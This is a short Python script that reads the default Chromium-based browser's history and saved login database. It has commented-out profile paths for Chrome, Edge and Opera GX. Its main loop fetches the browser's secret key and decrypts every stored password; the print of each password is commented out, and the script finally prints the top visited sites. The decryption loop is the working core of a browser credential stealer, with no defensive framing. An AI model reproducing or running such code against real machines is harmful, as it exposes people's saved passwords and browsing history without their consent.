from chromiumBrowser import Chromium
import dataComprehention
import getBrowser

chromiumParams = getBrowser.getChromiumParams()
defaultBrowser = Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])

#googleChrome = Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
#microsoftEdge = Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
#operaGX = Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")

history = defaultBrowser.getHistory()
loginData = defaultBrowser.getLoginData()

for login in loginData:
    url = login["origin_url"]
    username = login["username_value"]
    ciphertext = login["password_value"]

    if url == "" or username == "": continue
    secretKey = defaultBrowser.getSecretKey()
    password = defaultBrowser.decryptPassword(ciphertext, secretKey)

    #print(password)

topWebsites = dataComprehention.topWebsitesVisited(history)
print(topWebsites)